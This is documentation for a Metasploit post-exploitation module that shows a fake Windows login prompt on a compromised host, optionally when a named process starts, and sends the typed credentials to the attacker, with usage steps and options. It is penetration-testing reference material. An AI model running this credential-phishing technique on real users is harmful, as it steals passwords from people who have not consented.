## Vulnerable Application

  This module is able to perform a phishing attack on the target by
  popping up a login prompt. When the user fills credentials in the
  login prompt, the credentials will be sent to the attacker. The
  module is able to monitor for new processes and popup a login prompt
  when a specific process is starting. Tested on Windows 7.

## Verification Steps

  1. Start msfconsole
  2. Get meterpreter session
  3. Do: ```use post/windows/gather/phish_windows_credentials```
  4. Do: ```set SESSION <session id>```
  5. Do: ```run```

## Options

  **DESCRIPTION**

  Message shown in the login prompt.

  **PROCESS**

  Prompt if a specific process is started by the target. (e.g. `calc.exe` or specify * for all processes.)

  **SESSION**

  The session to run this module on.
